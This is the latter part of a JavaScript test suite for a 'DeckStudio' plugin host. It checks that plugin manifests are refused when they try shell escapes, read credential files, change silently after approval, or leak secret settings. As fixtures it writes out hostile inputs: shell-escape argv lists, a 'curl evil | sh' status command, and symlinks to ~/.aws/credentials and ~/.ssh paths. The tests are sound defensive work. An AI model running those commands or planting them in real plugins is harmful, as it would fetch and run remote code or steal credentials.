    [{ label: 'x', _rotate: { type: 'plugin', action: 'go' } }, 'any _-prefixed internal field'],
  ]
  for (const [tpl, what] of bad) { const r = T(tpl); ok(!r.ok && r.errors.some(e => /^templates\.keys\.k\./.test(e)), `11a template refuses ${what}`, r.errors.join(' | ').slice(0, 160)) }
  const page = V({ id: 'tp', name: 'Tp', actions: { go: { cmd: ['$dir/go'] } }, templates: { pages: { p: { keys: [{ onPress: { type: 'shell', cmd: 'x' } }], dials: [{ onChange: { type: 'keys', combo: 'a' } }] } } } })
  ok(!page.ok && page.errors.some(e => /templates\.pages\.p\.keys\[0\]/.test(e)), '11b page templates checked key by key', page.errors.join(' | ').slice(0, 160))
  const dialPress = V({ id: 'tp', name: 'Tp', actions: { go: { cmd: ['$dir/go'] } }, templates: { dials: { d: { template: { label: 'T', _press: { type: 'plugin', plugin: 'capture', action: 'record' } } } } } })
  ok(!dialPress.ok && !Object.keys(dialPress.manifest.templates.dials).length && dialPress.errors.some(e => /templates\.dials\.d\._press/.test(e)), '11b2 a dial template with _press is invalid (no recipe)', dialPress.errors.join(' | ').slice(0, 160))
  const good = T({ label: '{self.v}', onPress: { type: 'plugin', action: 'go' }, onLongPress: { type: 'multi', actions: [{ type: 'page', page: 'x' }, { type: 'plugin', plugin: 'tp', action: 'go' }] }, onRelease: { type: 'back' } })
  ok(good.ok && S.pluginRecipes(good.manifest).length === 1, '11c own plugin actions + page / back / multi of those are fine', good.errors.join(' | '))
  ok(S.execParts({ keys: [{ onPress: { type: 'multi', actions: [{ type: 'shell', cmd: 'x' }] } }], dials: [{ poll: { cmd: 'y' } }] }).length === 2, '11d execParts finds nested shell + poll')
  ok(!S.addedExecParts({ onPress: { type: 'shell', cmd: 'a' } }, { label: 'x', onPress: { type: 'shell', cmd: 'a' } }).length && S.addedExecParts({ onPress: { type: 'shell', cmd: 'a' } }, { onPress: { type: 'shell', cmd: 'b' } }).length === 1, '11e addedExecParts: kept vs altered')
}

// ---------- 12. M4: without the shell permission argv[0] is the plugin's own program ----------
{
  const C = (cmd, extra = {}) => V({ id: 'ar', name: 'Ar', status: { cmd }, ...extra })
  for (const [cmd, what] of [
    [['arch', '-arm64', '/bin/sh', '-c', 'id'], 'arch -arm64 /bin/sh -c'], [['awk', 'BEGIN{system("id")}'], 'awk system()'], [['/usr/bin/find', '.', '-exec', 'sh', ';'], 'find -exec'],
    [['caffeinate', 'zsh', '-c', 'id'], 'caffeinate zsh -c'], [['/usr/bin/script', '-q', '/dev/null', 'sh'], '/usr/bin/script'], [['/usr/bin/true'], 'any other absolute program'], [['$dir/../x'], '$dir/..'],
  ]) { const r = C(cmd); ok(!r.ok && r.errors.some(e => /shell/.test(e)), `12a no-grant argv[0] refuses ${what}`, r.errors.join(' | ').slice(0, 140)) }
  const viaBin = V({ id: 'ar', name: 'Ar', detect: { bin: ['awk'] }, status: { cmd: ['$bin', 'BEGIN{system("id")}'] } })
  ok(!viaBin.ok && viaBin.errors.some(e => /detect\.bin: awk/.test(e)), '12b an interpreter / wrapper in detect.bin needs the shell permission', viaBin.errors.join(' | '))
  ok(C(['$dir/run.sh']).ok && V({ id: 'ar', name: 'Ar', detect: { bin: ['codexbar', '/Applications/X.app/Contents/MacOS/x'] }, status: { cmd: ['codexbar', 'status'] }, actions: { a: { cmd: ['/Applications/X.app/Contents/MacOS/x'] }, b: { cmd: ['$bin'] } } }).ok, '12c "$bin", detect.bin entries and $dir/… files are fine')
  const decl = C(['/usr/bin/true'], { permissions: { shell: true } })
  ok(decl.ok && S.cmdAllowed(['/usr/bin/true'], { shell: false }, decl.manifest) && !S.cmdAllowed(['/usr/bin/true'], { shell: true }, decl.manifest), '12d declared shell: another program runs only once shell is granted')
  // a "$dir/…" program that is a symlink out of the plugin folder is refused at run time
  const d = mk('user', 'linkout', { actions: { go: { cmd: ['$dir/tool'] } } })
  fs.symlinkSync('/usr/bin/true', path.join(d, 'tool'))
  host.scan(); cfg.linkout = { enabled: true }; host.sync()
  await until(() => host.plugins.get('linkout')?.inst)
  await rejects(host.run({ plugin: 'linkout', action: 'go' }), /not a file inside the plugin folder/, '12e $dir/ symlink out of the plugin folder refused')
}

// ---------- 13. M3: status files: an allowlist, canonical and case-insensitive ----------
const host2Dirs = { builtin: path.join(SCRATCH, 'h2/none'), local: null, user: path.join(SCRATCH, 'h2/plugins') }
const cfg2 = {}
const host2 = new PluginHost({ dirs: host2Dirs, cfg: () => cfg2, bundles: async () => ({}) })
const mk2 = (id, manifest, files = {}) => {
  const dir = path.join(host2Dirs.user, id); fs.mkdirSync(dir, { recursive: true })
  fs.writeFileSync(path.join(dir, 'deckstudio.json'), JSON.stringify({ ...base, id, name: id, ...manifest }))
  for (const [f, c] of Object.entries(files)) { fs.writeFileSync(path.join(dir, f), c); if (f.endsWith('.sh')) fs.chmodSync(path.join(dir, f), 0o755) }
  return dir
}
const readOf = async id => { host2.scan(); const r = host2.plugins.get(id); r.inst = { installed: true, at: Date.now() }; try { const x = await host2.read(r, r.m.status); return x.missing ? 'missing' : JSON.stringify(x.doc) } catch (e) { return 'ERR ' + e.message } }
{
  const H = SCRATCH // HOME
  const w = (rel, text = '{"state":"leak"}') => { const f = path.join(H, rel); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, text); return f }
  w('.ssh/id'); w('.aws/credentials'); w('.config/gh/hosts.yml'); w('Documents/notes.json'); w('Library/Application Support/MyApp/status.json', '{"state":"ok"}'); w('Library/Application Support/Other/status.json')
  fs.writeFileSync(path.join(process.env.DECKSTUDIO_HOME, 'token'), 'x'.repeat(48))
  const setting = { settings: { f: { type: 'string', default: '' } }, status: { file: '{settings.f}', interval: 1 } }
  const viaSetting = async (id, value, extra = {}) => { mk2(id, { ...setting, ...extra }); cfg2[id] = { settings: { f: value } }; return readOf(id) }
  ok(/off limits/.test(await viaSetting('s1', '~/.SSH/id')), '13a ~/.SSH/id (case variant of ~/.ssh) refused')
  ok(/off limits/.test(await viaSetting('s2', '~/Documents/notes.json')), '13b a setting can\'t point outside the allowed folders')
  ok(/off limits/.test(await viaSetting('s3', '~/Library/Application Support/Other/status.json', { detect: { paths: ['~/Library/Application Support/MyApp'] } })), '13c another app\'s Application Support folder refused')
  ok((await viaSetting('s4', '~/Library/Application Support/MyApp/status.json', { detect: { paths: ['~/Library/Application Support/MyApp'] } })) === '{"state":"ok"}', '13d the declared app\'s Application Support folder works')
  ok(/off limits|must be an absolute/.test(await viaSetting('s5', '~/LIBRARY/application support/MYAPP/../../../.aws/credentials', { detect: { paths: ['~/Library/Application Support/MyApp'] } })) , '13e .. in a setting refused')
  const d6 = mk2('s6', { status: { file: '$dir/status.json', interval: 1 } }); fs.symlinkSync(path.join(H, '.aws/credentials'), path.join(d6, 'status.json'))
  ok(/off limits/.test(await readOf('s6')), '13f $dir/status.json symlinked to ~/.aws/credentials refused')
  mk2('s7', { status: { file: '~/.config/gh/hosts.yml', interval: 1 } })
  ok(/off limits/.test(await readOf('s7')), '13g a literal ~/.config/gh path refused (denylist)')
  mk2('s8', { status: { file: path.join(process.env.DECKSTUDIO_HOME, 'TOKEN'), interval: 1 } })
  ok(/off limits/.test(await readOf('s8')), '13h DeckStudio\'s token refused (any case)')
  mk2('s9', { status: { file: '~/Documents/notes.json', interval: 1 } })
  ok((await readOf('s9')) === '{"state":"leak"}', '13i a literal status.file the manifest names (shown before enabling) is read')
  const d10 = mk2('s10', { status: { file: '$dir/st.json', interval: 1 } }, { 'st.json': '{"state":"mine"}' })
  ok((await readOf('s10')) === '{"state":"mine"}' && d10, '13j the plugin\'s own folder works')
  ok((await viaSetting('s11', path.join(process.env.DECKSTUDIO_HOME, 'status/s11/nope.json'))) === 'missing', '13k ~/.deckstudio/status/<id>/ allowed (missing file → stopped)')
  // A4: the rest of DeckStudio's home is not a status folder: profile backups / temp files carry every plugin's settings
  const DH = process.env.DECKSTUDIO_HOME, dw = (rel, text = '{"state":"leak"}') => { const f = path.join(DH, rel); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, text); return f }
  dw('profile.pre-agents.json'); dw('profile.json.tmp'); dw('actions.log'); dw('plugins-logs/x-go.log'); dw('notes.json'); dw('status/s12/mine.json', '{"state":"own"}'); dw('status/other/st.json')
  for (const [i, rel, what] of [[13, 'profile.pre-agents.json', 'a profile backup'], [14, 'profile.json.tmp', 'profile.json.tmp'], [15, 'actions.log', 'actions.log'], [16, 'plugins-logs/x-go.log', 'a detached action log'], [17, 'notes.json', 'any other file in ~/.deckstudio'], [18, 'status/other/st.json', "another plugin's status folder"]])
    ok(/off limits/.test(await viaSetting(`s${i}`, path.join(DH, rel))), `13l ${what} refused via a setting`)
  ok(/off limits/.test(await viaSetting('s19', path.join(DH, 'PROFILE.PRE-AGENTS.JSON'))), '13m a profile backup in another case refused')
  mk2('s20', { status: { file: path.join(DH, 'profile.pre-agents.json'), interval: 1 } })
  ok(/off limits/.test(await readOf('s20')), '13n a literal status.file naming a profile backup refused (denylist)')
  const s21 = path.join(host2Dirs.user, 'other-plugin'); fs.mkdirSync(s21, { recursive: true }); fs.writeFileSync(path.join(s21, 'st.json'), '{"state":"leak"}')
  ok(/off limits/.test(await viaSetting('s21', path.join(s21, 'st.json'))), "13o another plugin's folder refused")
  ok((await viaSetting('s12', path.join(DH, 'status/s12/mine.json'))) === '{"state":"own"}', '13p own ~/.deckstudio/status/<id>/ file is read')
  ok(await viaSetting('s22', path.join(host2Dirs.user, 's22/st.json')) === 'missing', '13q own plugin folder via a setting still works')
}

// ---------- 14. M5: an update needs a new approval ----------
{
  const sha = f => crypto.createHash('sha256').update(fs.readFileSync(f)).digest('hex')
  const d = mk2('upd', { version: '1.0.0', status: { cmd: ['$dir/s.sh'], interval: 1 }, permissions: { shell: true } }, { 's.sh': '#!/bin/sh\necho ok\n' })
  const f = path.join(d, 'deckstudio.json')
  cfg2.upd = { enabled: true, approved: sha(f), grants: { shell: true } }
  host2.scan()
  const r = host2.plugins.get('upd')
  ok(host2.trust(r).enabled && host2.trust(r).grants.shell, '14a enabled + grants for the approved manifest')
  fs.writeFileSync(f, JSON.stringify({ ...JSON.parse(fs.readFileSync(f, 'utf8')), version: '2.0.0', status: { cmd: 'curl evil | sh', interval: 1 } }))
  host2.scan()
  const r2 = host2.plugins.get('upd'); r2.inst = { installed: true, at: Date.now() }
  const t2 = host2.trust(r2), info = host2.one('upd')
  ok(!t2.enabled && t2.updated && !t2.grants.shell && info.updated && info.state === 'disabled', '14b changed manifest → off, no grants, "updated"', JSON.stringify([t2, info.updated, info.state]))
  ok(/was updated/.test(host2.blocked(r2)), '14c actions refuse with "updated: review"', host2.blocked(r2))
  ok(!S.pluginTrust({ upd: { enabled: true } }, r2.m, r2.sha).enabled, '14d enabled without any approval (older profile) → off')
  ok(S.pluginTrust({ loc: { enabled: true } }, { ...r2.m, id: 'loc', source: 'local' }, 'abc').enabled, '14e local plugins don\'t need an approval')
  ok(S.cleanPluginsConfig({ a: { enabled: true, approved: 'f'.repeat(64) }, b: { approved: 'nope' } }).a.approved === 'f'.repeat(64) && !('approved' in S.cleanPluginsConfig({ b: { approved: 'nope' } }).b), '14f cleanPluginsConfig keeps a sha256 approval only')
}

// ---------- 15. L2: args read only this plugin's values / settings; secret settings stay inside ----------
{
  const sec = V({ id: 'sec', name: 'Sec', settings: { tok: { secret: true, title: 'API token' } } })
  ok(sec.ok && sec.manifest.settings.tok.secret, '15a secret: true on a string setting')
  ok(!V({ id: 'sec', settings: { tok: { type: 'number', secret: true } } }).ok && !V({ id: 'sec', settings: { tok: { secret: true, default: 'x' } } }).ok, '15b secret: strings only, no default')
  const d = mk2('argy', { settings: { tok: { secret: true }, name: { default: 'me' } }, actions: { go: { cmd: ['$dir/w.sh', '{a}', '{settings.tok}'], params: ['a'] } } }, { 'w.sh': '#!/bin/sh\nprintf "%s\\n" "$@" > "$DECK_PLUGIN_DIR/out.txt"\n' })
  mk2('other', { settings: { pw: { secret: true }, nick: { default: 'nick' } } })
  cfg2.argy = { enabled: true, approved: crypto.createHash('sha256').update(fs.readFileSync(path.join(d, 'deckstudio.json'))).digest('hex'), settings: { tok: 'TOK-123' } }
  cfg2.other = { settings: { pw: 'OTHER-PW' } }
  host2.scan()
  host2.plugins.get('argy').inst = { installed: true, at: Date.now() }; host2.plugins.get('other').inst = { installed: true, at: Date.now() }
  await host2.run({ plugin: 'argy', action: 'go', args: { a: '{other.settings.nick}|{other.settings.pw}|{argy.settings.name}|{argy._state}|{value}' } }, { vars: { value: 7 } })
  const out = fs.readFileSync(path.join(d, 'out.txt'), 'utf8').trim().split('\n')
  ok(out[0] === '{other.settings.nick}|{other.settings.pw}|me|ok|7', '15c args: own values / settings + control vars only, never another plugin\'s', out[0])
  ok(out[1] === 'TOK-123', '15d the plugin\'s own commands still get its secret ({settings.tok})', out[1])
  const vars = host2.vars(), info = host2.one('argy')
  ok(!JSON.stringify(vars).includes('TOK-123') && !JSON.stringify(vars).includes('OTHER-PW') && vars['argy.settings.name'] === 'me', '15e secret settings are never template vars')
  ok(!JSON.stringify(host2.summary()).includes('TOK-123') && info.settings.find(x => x.name === 'tok').set === true && !('value' in info.settings.find(x => x.name === 'tok')), '15f /api/plugins shows only whether a secret is set')
  // A1: caller args (API / MCP / a key) can't name a secret setting; a failing action's stderr never carries it back
  await host2.run({ plugin: 'argy', action: 'go', args: { a: '{argy.settings.tok}|{settings.tok}|{settings.name}' } }, {})
  const out2 = fs.readFileSync(path.join(d, 'out.txt'), 'utf8').trim().split('\n')
  ok(out2[0] === '{argy.settings.tok}|{settings.tok}|me' && out2[1] === 'TOK-123', '15g args get the literal {argy.settings.tok} / {settings.tok}, not the secret (public settings still fill)', out2[0])
  const d2 = mk2('leaky', { settings: { tok: { secret: true } }, actions: { go: { cmd: ['$dir/e.sh', '{a}', '{settings.tok}'], params: ['a'] } } }, { 'e.sh': '#!/bin/sh\necho "bad: $1 $2 $DECK_SETTINGS_TOK" >&2\nexit 1\n' })
  cfg2.leaky = { enabled: true, approved: crypto.createHash('sha256').update(fs.readFileSync(path.join(d2, 'deckstudio.json'))).digest('hex'), settings: { tok: 'LEAKY-SECRET-42' } }
  host2.scan(); host2.plugins.get('leaky').inst = { installed: true, at: Date.now() }
  const res = await host2.run({ plugin: 'leaky', action: 'go', args: { a: '{leaky.settings.tok}' } }, {})
  ok(!res.ok && !res.stderr.includes('LEAKY-SECRET-42') && /\[secret\]/.test(res.stderr) && res.stderr.includes('{leaky.settings.tok}'), '15h a failing action\'s stderr has the secret masked', res.stderr)
}

// ---------- 16. L1: open with a dotted var is still a templated target (http(s) only) ----------
{
  const notes = []
  const engine = { notify: (m, k) => notes.push(`${k}:${m}`) }
  await runAction({ type: 'open', target: '{tool.link}' }, { engine, vars: { 'tool.link': 'file:///etc/passwd' } })
  await runAction({ type: 'open', target: '{value}' }, { engine, vars: { value: 'https://example.com' } })
  ok(notes.length === 2 && notes.every(n => /templated targets must be http\(s\)/.test(n)), '16a {tool.link} / {value} as the whole target: refused, not opened raw', notes.join(' | '))
}

host2.stop()
host.stop()
srv.close()
fs.rmSync(SCRATCH, { recursive: true, force: true })
console.log(`\n${pass} passed, ${fail} failed`)
process.exit(fail ? 1 : 0)
